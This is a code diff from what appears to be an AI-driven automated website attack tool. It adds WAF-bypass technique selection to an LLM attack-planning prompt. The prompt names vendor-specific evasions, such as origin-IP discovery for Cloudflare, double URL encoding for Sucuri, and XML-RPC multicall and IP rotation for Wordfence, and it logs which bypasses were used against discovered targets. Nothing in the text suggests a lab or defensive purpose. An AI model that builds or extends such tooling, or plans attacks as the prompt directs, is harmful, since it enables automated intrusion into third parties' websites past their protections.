@@ -37,6 +37,7 @@ import { runLearningCycle, runEnhancedLearningCycle, queryHistoricalPatterns, ca
 import type { HistoricalPattern, MethodSuccessRate } from "./adaptive-learning";
 import { isBlacklisted, isOwnRedirectUrl, recordFailedAttack, recordSuccessfulAttack, filterTargets } from "./attack-blacklist";
 import { notifyAttackCompleted } from "./learning-scheduler";
+import { selectBypassTechniques, getWafBypassProfile, notifyWafBypassSuccess, getWafTargetingRecommendation, type WafBypassTechnique, type WafBypassProfile } from "./waf-bypass-strategies";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -216,11 +217,12 @@ async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
   let historicalContext: Record<string, unknown> = {};
   let blacklistedMethods: string[] = [];
   try {
-    const [cmsPatterns, wafPatterns, globalRates, cmsProfile] = await Promise.all([
+    const [cmsPatterns, wafPatterns, globalRates, cmsProfile, wafBypassData] = await Promise.all([
       target.cms ? queryHistoricalPatterns({ cms: target.cms }) : Promise.resolve([]),
       target.waf ? queryHistoricalPatterns({ waf: target.waf }) : Promise.resolve([]),
       calculateMethodSuccessRates({ minAttempts: 2 }),
       target.cms ? getCmsAttackProfile(target.cms) : Promise.resolve(null),
+      target.waf ? selectBypassTechniques(target.waf, { maxTechniques: 8 }) : Promise.resolve(null),
     ]);
 
     // ═══ METHOD BLACKLIST: Skip methods that consistently fail for this target profile ═══
@@ -262,6 +264,18 @@ async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
       } : null,
       blacklistedMethods,
       blacklistReason: `Methods with <${FAIL_RATE_LIMIT}% success rate after ${FAIL_THRESHOLD}+ attempts`,
+      wafBypassProfile: wafBypassData ? {
+        wafVendor: wafBypassData.profile.wafVendor,
+        overallBypassRate: wafBypassData.profile.overallBypassRate,
+        knownWeaknesses: wafBypassData.profile.knownWeaknesses.slice(0, 3),
+        recommendedTechniques: wafBypassData.techniques.slice(0, 5).map(t => ({
+          name: t.name,
+          description: t.description,
+          confidence: t.learnedConfidence ?? t.baseConfidence,
+          category: t.category,
+        })),
+        reasoning: wafBypassData.reasoning,
+      } : null,
     };
   } catch (e: any) {
     console.warn(`[Agentic] Historical data fetch failed: ${e.message}`);
@@ -307,6 +321,11 @@ CRITICAL RULES:
 3. If a CMS profile exists with a bestMethod, strongly prefer that method.
 4. If no historical data exists, use standard heuristics based on target fingerprint.
 5. Order methods from most likely to succeed to least likely.
+6. If wafBypassProfile is provided, PRIORITIZE waf_bypass method and use the recommended bypass techniques.
+   - For Cloudflare: prefer origin_ip_discovery first, then chunked_transfer, websocket_upgrade
+   - For Sucuri: prefer large_body_bypass, double_url_encoding, content_type_confusion
+   - For Wordfence: prefer rest_api_bypass, xmlrpc_multicall, ip_rotation
+7. If WAF is detected, always include waf_bypass in the top 3 methods.
 
 Return JSON: { "attackOrder": ["method1", "method2", ...], "reasoning": "...", "estimatedSuccess": 0-100 }
 Only use methods from the availableMethods list.`
@@ -909,7 +928,7 @@ async function attackSingleTarget(
             method: currentMethodPriority[0] || "unified_pipeline",
             exploitType: "multi_step",
             payloadType: null,
-            wafBypassUsed: [],
+            wafBypassUsed: currentMethodPriority.filter(m => m.includes("waf")).slice(0, 3),
             payloadModifications: [],
             attackPath: null,
             attemptNumber: attempt + 1,
